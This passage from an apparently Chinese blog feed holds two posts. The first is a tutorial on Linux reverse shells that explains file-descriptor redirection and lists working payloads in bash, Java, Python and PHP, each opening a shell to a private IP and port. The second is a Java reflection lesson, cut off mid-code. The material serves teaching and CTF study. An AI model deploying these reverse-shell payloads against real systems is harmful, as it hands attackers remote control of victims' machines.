      <category term="Django signed_cookies" scheme="http://yoursite.com/tags/Django-signed-cookies/"/>
    
  </entry>
  
  <entry>
    <title>Linux 反弹 shell</title>
    <link href="http://yoursite.com/2019/09/10/%E5%8F%8D%E5%BC%B9%20shell/"/>
    <id>http://yoursite.com/2019/09/10/反弹 shell/</id>
    <published>2019-09-10T07:57:15.022Z</published>
    <updated>2019-09-10T07:54:51.473Z</updated>
    
    <content type="html"><![CDATA[<p>做题目遇到了，就去查了一些这方面的资料，总结一下。</p><a id="more"></a><h1 id="文件描述符与重定向"><a href="#文件描述符与重定向" class="headerlink" title="文件描述符与重定向"></a>文件描述符与重定向</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><ul><li>文件描述符是一个非负整数，它指向一个打开的文件，可以理解为指针指向打开的文件，但它并不是指针</li><li>实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。一般适用于 Linux 和 Unix 系统</li><li>也可以理解为文件的身份 ID，用于表明每个被进程打开的文件</li><li>每一个文件描述符会与一个打开文件相对应，同时，不同的文件描述符也会指向同一个文件</li><li>一般情况下，Linux 下的三个默认文件描述符如下 : <ul><li>0 表示标准输入，只读</li><li>1 表示标准输出，只写</li><li>2 表示标准错误输出，只写</li></ul></li><li>程序刚刚启动的时候，0 是标准输入，1 是标准输出，2 是标准错误输出。如果此时去打开一个新的文件，它的文件描述符会是 3 </li><li>在 Linux 中，一切都是文件，键盘显示器设备都是文件，它们的输入输出也由文件描述符控制</li></ul><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul><li><p>重定向主要有两种 : </p><ul><li>输入重定向 <code>&lt;</code> : 对 0 重定向</li><li>输出重定向 <code>&gt;</code> : 对 1 重定向</li></ul></li><li><p>bash 在执行一条指令时，首先会处理重定向符号</p></li><li><p>如果指令中存在多个重定向，那么它的解析顺序是从左向右</p></li><li><p>输入重定向( <code>&lt;</code> )例子如下，首先解析器会先解析重定向，将标准输入指向 file，这时再使用 cat 从标准输入读取时，就会读取 file</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_1.PNG" alt></p></li><li><p>输出重定向( <code>&gt;</code> )例子如下，首先解析器会先解析重定向，将标准输出指向 file，这时使用 echo 输入字符串，就会直接输入到 file 中</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_2.PNG" alt></p></li><li><p>标准输出与标准错误输出重定向( <code>&amp;&gt;</code> )例子如下，首先，执行一个错误的命令，可以看到，错误输出到了 file 中，后面执行一个正确的命令，结果也输出到了 file 中。这两个命令等价于 <code>mkdir 1&gt; file 2&gt;&amp;1</code> 和 <code>ls 1&gt; file 2&gt;&amp;1</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_3.PNG" alt></p></li><li><p>0、1、2 是默认的文件描述符，其之后的可以自行使用，例子如下，创建文件描述符 3 并指向 file，然后 cat 读取</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_4.PNG" alt></p></li><li><p>还有一种重定向，<code>&lt;&gt;</code> 表示同时对文件进行读写，例子如下。以读写模式打开 file 同时将文件描述符 6 指向 file，然后 cat 读取</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_5.PNG" alt></p></li></ul><h1 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h1><h2 id="什么是反弹-shell"><a href="#什么是反弹-shell" class="headerlink" title="什么是反弹 shell"></a>什么是反弹 shell</h2><ul><li><p>就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。其本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p></li><li><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web 服务，ssh，telnet 等等，都是正向连接。</p></li><li><p>那么什么时候使用反弹 shell 呢？</p><ul><li>靶机中了你的网马，但是它在局域网内，直接连接不了</li><li>靶机的 IP 会动态改变，不能持续控制</li><li>由于防火墙等限制，靶机只能发送请求，不能接收请求</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策</li></ul></li><li><p>所谓反弹 shell，就是受害者连接攻击者指定的服务端，从而使攻击者 getshell</p></li><li><p>举个例子，靶机 : 192.168.233.132，攻击者 : 192.168.233.130，在攻击者上执行 <code>nc -lvp 4096</code> 监听 4096 端口，在靶机上执行 <code>bash -i &gt;&amp; /dev/tcp/192.168.233.130/4096 0&gt;&amp;1</code>，将会有如下界面 : </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_6.PNG" alt></p></li></ul><h2 id="反弹-shell-分析"><a href="#反弹-shell-分析" class="headerlink" title="反弹 shell 分析"></a>反弹 shell 分析</h2><ul><li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><ul><li><code>bash -i</code> 创建一个交互式 bash 进程</li><li><code>/dev/tcp/ip/port</code> 与 <code>IP:port</code> 建立一个 TCP 连接</li><li>这里相当于 <code>bash -i 1&gt; /dev/tcp/ip/port 2&gt;&amp;1</code> 先将文件描述符 1 重定向到 <code>/dev/tcp/ip/port</code> ，然后再将文件描述符 2 重定向到 <code>/dev/tcp/ip/port</code></li><li><code>0&gt;&amp;1</code> 将文件描述符 0 重定向到 <code>/dev/tcp/ip/port</code></li><li>最终所有的标准输入输出都在这个文件中，很明显完成了反弹 shell</li></ul></li><li><code>bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5</code><ul><li><code>5&lt;&gt;/dev/tcp/host/port</code> 以读写方式打开 <code>/dev/tcp/host/port</code>，并将文件描述符重定向到 <code>/dev/tcp/host/port</code></li><li><code>0&gt;&amp;5</code> 文件描述符 0 重定向到 5</li><li><code>1&gt;&amp;5</code> 文件描述符 1 重定向到 5</li><li>最终文件描述符 0 和 1都重定向到 <code>/dev/tcp/host/port</code> 完成 反弹 shell</li></ul></li><li><code>exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line &gt;&amp;5; done</code><ul><li><code>exec 5&lt;&gt;/dev/tcp/host/port</code> 以读写方式打开 <code>/dev/tcp/host/port</code>，并将文件描述符重定向到 <code>/dev/tcp/host/port</code></li><li><code>cat &lt;&amp;5</code> 将文件描述符 5 重定向到 cat 中，即 cat 读取 &amp;5 的内容，也即 cat 读取 <code>/dev/tcp/host/port</code> 中的内容</li><li><code>|</code> 将 cat 读取的结果作为后面的输入</li><li><code>while read line; do $line &gt;&amp;5; done</code> 循环读取 <code>cat &lt;&amp;5</code> 中的内容，赋值给 line，然后 $line 执行 line，最后 &gt;&amp;5 表示将 bash 的输出和错误重定向到文件描述符 5 中，即 <code>/dev/tcp/host/port</code> 中</li></ul></li></ul><h1 id="Java-反弹-shell"><a href="#Java-反弹-shell" class="headerlink" title="Java 反弹 shell"></a>Java 反弹 shell</h1><ul><li><p>基本方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;).waitFor();</span><br></pre></td></tr></table></figure></li><li><p>或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;).waitFor();</span><br></pre></td></tr></table></figure></li><li><p><code>/bin/bash</code> 是需要运行的程序，<code>-c</code> 和 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code> 都是作为 <code>/bin/bash</code> 的参数。<code>bash -c &quot;cmd string&quot;</code> 意为 shell 运行 <code>cmd string</code>，所以上述代码就是利用 shell 运行 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p></li></ul><h1 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.31.41"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure><h1 id="PHP-反弹-shell"><a href="#PHP-反弹-shell" class="headerlink" title="PHP 反弹 shell"></a>PHP 反弹 shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(<span class="string">"192.168.31.41"</span>,<span class="number">8080</span>);</span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做题目遇到了，就去查了一些这方面的资料，总结一下。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="反弹 shell" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BC%B9-shell/"/>
    
  </entry>
  
  <entry>
    <title>Java 反射机制</title>
    <link href="http://yoursite.com/2019/09/10/Java%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>http://yoursite.com/2019/09/10/Java 反射机制/</id>
    <published>2019-09-10T07:57:15.022Z</published>
    <updated>2019-09-10T07:55:44.630Z</updated>
    
    <content type="html"><![CDATA[<p>关于 Java 反射的一些基础知识，有待补充</p><a id="more"></a><h1 id="Class-概述"><a href="#Class-概述" class="headerlink" title="Class 概述"></a>Class 概述</h1><ul><li><p>反射允许我们在运行时发现和使用类的信息</p></li><li><p>类型信息在运行时由被称为 <code>Class</code> 对象的特殊对象表示，它包含了与类有关的信息</p></li><li><p><code>Class</code> 对象就是用来创建类的所有的常规对象的</p></li><li><p>类是程序的一部分，每个类都有一个 <code>Class</code> 对象。每当编写并编译了一个新类，就会产生一个<code>Class</code> 对象，即被保存在一个同名的 <code>.class</code> 文件中。为了生成这个类的对象，运行这个程序的 Java 虚拟机将使用被称为 “类加载器” 的子系统。</p></li><li><p>所有的类都是在对其第一次使用时，动态加载到 JVM 中的。当程序创建第一个对类的静态成员引用时，就会加载这个类。在使用 <code>new</code> 创建类的新对象时，也会被当做对类的静态成员的引用。</p></li><li><p>Java 程序在其开始运行之前并非被完全加载，其各个部分是在必须时才加载的。这就是它的动态加载机制。</p></li><li><p>类加载器首先检查这个类的 <code>Class</code> 对象是否已经加载，如果尚未加载，默认的类加载器会根据类名查找 <code>.class</code> 文件。一旦某个类的 <code>Class</code> 对象被加载到内存，它就被用来创建这个类的所有对象。</p></li><li><p>以下面这段代码为例 : </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Candy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; print(<span class="string">" loading Candy"</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gum</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; print(<span class="string">" loading Gum "</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cookie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; print(<span class="string">" loading Cookie "</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        print(<span class="string">" inside main "</span>);</span><br><span class="line">        <span class="keyword">new</span> Candy();</span><br><span class="line">        <span class="keyword">new</span> Candy();</span><br><span class="line">        print(<span class="string">" after create Candy "</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">"Gum"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            print(<span class="string">" cannot find Gum "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        print(<span class="string">" after Class.forName(\"Gum\") "</span>);</span><br><span class="line">        <span class="keyword">new</span> Cookie();</span><br><span class="line">        print(<span class="string">" after create Cookie "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出</span></span><br><span class="line"><span class="comment"> inside main </span></span><br><span class="line"><span class="comment"> loading Candy</span></span><br><span class="line"><span class="comment"> after create Candy </span></span><br><span class="line"><span class="comment"> loading Gum </span></span><br><span class="line"><span class="comment"> after Class.forName("Gum") </span></span><br><span class="line"><span class="comment"> loading Cookie </span></span><br><span class="line"><span class="comment"> after create Cookie </span></span><br><span class="line"><span class="comment">/*</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>以上类中的 <code>static</code> 子句在类第一次被加载时执行。<code>Class</code> 对象仅在被需要时加载</p></li><li><p>对于 <code>forName</code> 函数，它是 <code>Class</code> 类的一个 static 成员，所有的 <code>Class</code> 对象都属于这个类。<code>Class</code> 对象和其他对象一样，我们可以获取并操作它的引用( 也就是类加载器的工作 )。<code>forName</code> 是取得 <code>Class</code> 对象的引用的一种方法，它是以类名的 string 作为参数，返回一个 <code>Class</code> 对象的引用，如果被引用类没有加载就加载该类。</p></li><li><p><code>getClass</code> 函数用来获取 <code>Class</code> 引用，它将返回表示该对象的实际类型的 <code>Class</code> 引用，即已知实例化对象获取类引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HasBatteries</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Waterproof</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Shoots</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">Toy</span> </span>&#123;</span><br><span class="line">    Toy() &#123;&#125;</span><br><span class="line">    Toy(<span class="keyword">int</span> i) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FancyToy 继承 Toy 并且继承三个接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FancyToy</span> <span class="keyword">extends</span> <span class="title">Toy</span> <span class="keyword">implements</span> <span class="title">HasBatteries</span>, <span class="title">Waterproof</span>, <span class="title">Shoots</span> </span>&#123;</span><br><span class="line">    FancyToy() &#123; <span class="keyword">super</span>(<span class="number">1</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printInfo</span><span class="params">(Class cc)</span> </span>&#123;</span><br><span class="line">        print(<span class="string">"Class name : "</span> + cc.getName() + <span class="string">" is interface? ["</span> + cc.isInterface() + <span class="string">"]"</span>);</span><br><span class="line">        print(<span class="string">"Simple name : "</span> + cc.getSimpleName());</span><br><span class="line">        print(<span class="string">"Canonical name : "</span> + cc.getCanonicalName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Class c = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Class.forName(<span class="string">"FancyToy"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            print(<span class="string">"FancyToy was not found"</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        printInfo(c);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Class face : c.getInterfaces()) &#123;</span><br><span class="line">            printInfo(face);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 c 的父类</span></span><br><span class="line">        Class up = c.getSuperclass();</span><br><span class="line">        Object obj = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化 up 的对象</span></span><br><span class="line">            obj = up.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            print(<span class="string">"cannot instance"</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            print(<span class="string">"cannot access"</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 Class 对象</span></span><br><span class="line">        printInfo(obj.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*输出</span></span><br><span class="line"><span class="comment">Class name : FancyToy is interface? [false]</span></span><br><span class="line"><span class="comment">Simple name : FancyToy</span></span><br><span class="line"><span class="comment">Canonical name : FancyToy</span></span><br><span class="line"><span class="comment">Class name : HasBatteries is interface? [true]</span></span><br><span class="line"><span class="comment">Simple name : HasBatteries</span></span><br><span class="line"><span class="comment">Canonical name : HasBatteries</span></span><br><span class="line"><span class="comment">Class name : Waterproof is interface? [true]</span></span><br><span class="line"><span class="comment">Simple name : Waterproof</span></span><br><span class="line"><span class="comment">Canonical name : Waterproof</span></span><br><span class="line"><span class="comment">Class name : Shoots is interface? [true]</span></span><br><span class="line"><span class="comment">Simple name : Shoots</span></span><br><span class="line"><span class="comment">Canonical name : Shoots</span></span><br><span class="line"><span class="comment">Class name : Toy is interface? [false]</span></span><br><span class="line"><span class="comment">Simple name : Toy</span></span><br><span class="line"><span class="comment">Canonical name : Toy</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="反射概述"><a href="#反射概述" class="headerlink" title="反射概述"></a>反射概述</h1><ul><li><p><code>Class</code> 类与 <code>java.lang.reflect</code> 类库一起构成了对 “反射” 的支持，该类库包含了 <code>Field</code>, <code>Method</code> 和 <code>Constructor</code> 类。这些类型的对象是由 JVM 在运行时创建的，用以表示未知类里对应的成员。这样就可以使用 <code>Constructor</code> 创建新的对象，用 <code>get()</code> 和 <code>set()</code> 函数读取和修改与 <code>Filed</code> 对象关联的字段，用 <code>invoke()</code> 方法调用与 <code>Method</code> 对象关联的方法。</p></li><li><p>当通过反射与一个未知类型的对象打交道时，JVM 只是简单地检查这个对象，看它属于哪个特定类。在用它做其他事情之前加载那个类的 <code>Class</code> 对象。因此，那个类的 <code>.class</code> 文件对于 JVM 来说必须是可获得的。对于反射机制来说，<code>.class</code> 文件在编译时不可获取，所以在运行时打开和检查 <code>.class</code> 文件</p></li><li><p>反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性</p></li><li><p>反射就是把 Java 类中的内容视为 Java 对象。例如：一个类有：成员变量、方法、构造方法、包等等信息，利用反射技术可以对一个类进行解剖，把每个组成部分映射成一个个对象。</p></li><li><p>以下面代码为例，反射的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 正向 : 由类到实例化对象</span></span><br><span class="line">       Person person = <span class="keyword">new</span> Person();</span><br><span class="line">       <span class="comment">// 反向 : 由实例化对象到类，这里就意味着反射</span></span><br><span class="line">       print(person.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Person</span></span><br></pre></td></tr></table></figure></li><li><p>以下面代码为例，如何实现反射及反射的利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        print(<span class="string">"hell Person"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       String s = <span class="string">"peri0d"</span>;</span><br><span class="line">       print(s);</span><br><span class="line">       print(s.getClass());</span><br><span class="line">       print(s.getClass().getName());</span><br><span class="line"></span><br><span class="line">       Person person = <span class="keyword">new</span> Person();</span><br><span class="line">       print(person.getClass());</span><br><span class="line">       print(person.getClass().getName());</span><br><span class="line"></span><br><span class="line">       Class c = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           c = Class.forName(<span class="string">"Person"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">           print(<span class="string">"Class Not Found"</span>);</span><br><span class="line">           System.exit(<span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Object obj = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           obj = c.newInstance();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot instance"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot access"</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Method met = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           met = obj.getClass().getDeclaredMethod(<span class="string">"hello"</span>, <span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 赋予权限</span></span><br><span class="line">           met.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">           print(<span class="string">"No Such Method"</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           met.invoke(obj, <span class="keyword">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot access"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot invocate target"</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 